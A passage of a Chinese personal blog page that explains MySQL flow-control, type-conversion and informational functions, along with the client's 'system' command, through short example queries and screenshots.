<h5 id="4-流程控制类函数"><a href="#4-流程控制类函数" class="headerlink" title="4. 流程控制类函数"></a>4. 流程控制类函数</h5><p>4.1 if(v,t,f)如果v为真返回t,否则返回f</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select if(1!=1,&apos;1&apos;,&apos;2&apos;) from dual;</span><br></pre></td></tr></table></figure>

<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1566374725514.png" alt="1566374725514"></p>
<p>4.2 ifnull(v1,v2)如果v1不为空则返回v1否则返回v2</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select ifnull(&apos;1&apos;,&apos;2&apos;);</span><br><span class="line">select ifnull(null,&apos;2&apos;);</span><br></pre></td></tr></table></figure>

<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1566375881842.png" alt="1566375881842"></p>
<p>4.3 case when v then v1 end 判断如果v为真则返回v1</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select case when 1=1 then &apos;true&apos; else &apos;false&apos; end from dual; 返回为true</span><br><span class="line">select case when 1!=1 then &apos;true&apos; else &apos;false&apos; end from dual; 返回false</span><br></pre></td></tr></table></figure>

<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1566376252417.png" alt="1566376252417"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select case when 1!=1 then &apos;true&apos; when 2=2 then &apos;mysql&apos; else &apos;false&apos; end from dual; 返回为mysql</span><br></pre></td></tr></table></figure>

<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1566376465597.png" alt="1566376465597"></p>
<h5 id="5-转换类函数"><a href="#5-转换类函数" class="headerlink" title="5. 转换类函数"></a>5. 转换类函数</h5><p>cast(v as type);转换数据类型。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select cast(&apos;20180222&apos; as time);</span><br></pre></td></tr></table></figure>

<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1566376783714.png" alt="1566376783714"></p>
<p><strong>注：</strong>Type参数：</p>
<ul>
<li><p>字符型：CHAR</p>
</li>
<li><p>日期：DATE     </p>
</li>
<li><p>时间：TIME</p>
</li>
<li><p>日期时间型：DATETIME</p>
</li>
<li><p>浮点数：DECIMAL</p>
</li>
<li><p>整数：SIGNED</p>
</li>
<li><p>无符号整数：UNSIGNED</p>
</li>
</ul>
<h5 id="6-数据库类函数"><a href="#6-数据库类函数" class="headerlink" title="6.数据库类函数"></a>6.数据库类函数</h5><ul>
<li><p>DATABASE() 返回当前数据库名称</p>
</li>
<li><p>VERSION() 返回当前数据库版本</p>
</li>
<li><p>INET_ATON(ip) 返回数字表示的IP</p>
</li>
<li><p>INET_NTOA(num) 将数字表示的IP转换为IP</p>
</li>
<li><p>PASSWORD(s) 返回加密版本</p>
</li>
<li><p>MD5(s) 返回MD5加密</p>
</li>
</ul>
<ol start="7">
<li><h5 id="system"><a href="#system" class="headerlink" title="system"></a>system</h5><p>mysql通过system后面衔接系统命令可以进行系统的查看，但仅限本地进行操作。</p>
</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system ls /etc;</span><br></pre></td></tr></table></figure>

<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1566377658806.png" alt="1566377658806"></p>
<p>远程进行操作如下：</p>
<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1566377714000.png" alt="1566377714000"></p>
<h4 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h4><p><a href="https://blog.csdn.net/cl_andywin/article/details/72886889" target="_blank" rel="noopener">https://blog.csdn.net/cl_andywin/article/details/72886889</a></p>

          
        
      
    </div>
    
    
    



    

    

    



    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
  </section>

  
  <nav class="pagination">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right"></i></a>
  </nav>



          </div>
          


          

        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      

      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <img class="site-author-image" itemprop="image" src="/uploads/avatar.jpg" alt="Darren-zl">
            
              <p class="site-author-name" itemprop="name">Darren-zl</p>
              <p class="site-description motion-element" itemprop="description">一天一小步，随着时间的积累，你将会发现你其实已经走了很远。</p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/">
              
                  <span class="site-state-item-count">15</span>
                  <span class="site-state-item-name">posts</span>
                </a>
              </div>
            

            

            

          </nav>

          

          
            <div class="links-of-author motion-element">
                
                  <span class="links-of-author-item">
                    <a href="https://github.com/Darren-zl" target="_blank" title="GitHub">
                      
                        <i class="fa fa-fw fa-github"></i>GitHub</a>
                  </span>
                
                  <span class="links-of-author-item">
                    <a href="https://weibo.com/p/1005052390784733/home?from=page_100505&mod=TAB&pids=plc_main" target="_blank" title="Weibo">
                      
                        <i class="fa fa-fw fa-weibo"></i>Weibo</a>
                  </span>
                
            </div>
          

          
          

          
          

          

        </div>
      </section>

      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Darren-zl</span>

  
</div>


  <!--<div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>-->



 <!-- <span class="post-meta-divider">|</span>-->



  <!--<div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>-->




        
<div class="busuanzi-count">
  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>

  
    <span class="site-uv">
      <i class="fa fa-user"></i> 访问人数
      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
      人
    </span>
  

  
    <span class="site-pv">
      <i class="fa fa-eye"></i> 总访问量
      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
      次
    </span>
  
</div>








        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  <div class="bg_content">
    <canvas id="canvas"></canvas>
</div>



  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  


  











  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  

  
  
    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  

  

  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  




  
    <script id="cy_cmt_num" src="https://changyan.sohu.com/upload/plugins/plugins.list.count.js?clientId=cytxCyGhU"></script>
  









  





  

  
  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.4.js"></script>
  <script>AV.initialize("29xnQ1C2kcwORHYYn7xsWTnS-gzGzoHsz", "Rq1Gk75oRwH78BryWUL4oYzj");</script>
  <script>
    function showTime(Counter) {
      var query = new AV.Query(Counter);
      var entries = [];
      var $visitors = $(".leancloud_visitors");

      $visitors.each(function () {
        entries.push( $(this).attr("id").trim() );
      });

      query.containedIn('url', entries);
      query.find()
        .done(function (results) {
          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';

          if (results.length === 0) {
            $visitors.find(COUNT_CONTAINER_REF).text(0);
            return;
          }

          for (var i = 0; i < results.length; i++) {
            var item = results[i];
            var url = item.get('url');
            var time = item.get('time');
            var element = document.getElementById(url);

            $(element).find(COUNT_CONTAINER_REF).text(time);
          }
          for(var i = 0; i < entries.length; i++) {
            var url = entries[i];
            var element = document.getElementById(url);
            var countSpan = $(element).find(COUNT_CONTAINER_REF);
            if( countSpan.text() == '') {
              countSpan.text(0);
            }
          }
        })
        .fail(function (object, error) {
          console.log("Error: " + error.code + " " + error.message);
        });
    }

    function addCount(Counter) {
      var $visitors = $(".leancloud_visitors");
      var url = $visitors.attr('id').trim();
      var title = $visitors.attr('data-flag-title').trim();
      var query = new AV.Query(Counter);

      query.equalTo("url", url);
      query.find({
        success: function(results) {
          if (results.length > 0) {
            var counter = results[0];
            counter.fetchWhenSave(true);
            counter.increment("time");
            counter.save(null, {
              success: function(counter) {
                var $element = $(document.getElementById(url));
                $element.find('.leancloud-visitors-count').text(counter.get('time'));
              },
              error: function(counter, error) {
                console.log('Failed to save Visitor num, with error message: ' + error.message);
              }
            });
          } else {
            var newcounter = new Counter();
            /* Set ACL */
            var acl = new AV.ACL();
            acl.setPublicReadAccess(true);
            acl.setPublicWriteAccess(true);
            newcounter.setACL(acl);
            /* End Set ACL */
            newcounter.set("title", title);
            newcounter.set("url", url);
            newcounter.set("time", 1);
            newcounter.save(null, {
              success: function(newcounter) {
                var $element = $(document.getElementById(url));
                $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
              },
              error: function(newcounter, error) {
                console.log('Failed to create');
              }
            });
          }
        },
        error: function(error) {
          console.log('Error:' + error.code + " " + error.message);
        }
      });
    }

    $(function() {
      var Counter = AV.Object.extend("Counter");
      if ($('.leancloud_visitors').length == 1) {
        addCount(Counter);
      } else if ($('.post-title-link').length > 1) {
        showTime(Counter);
      }
    });
  </script>



  

  
<script>
(function(){
    var bp = document.createElement('script');
    var curProtocol = window.location.protocol.split(':')[0];
    if (curProtocol === 'https') {
        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
    }
    else {
        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
    }
    var s = document.getElementsByTagName("script")[0];
    s.parentNode.insertBefore(bp, s);
})();
</script>


  
  

  

  

  



</body>
</html>
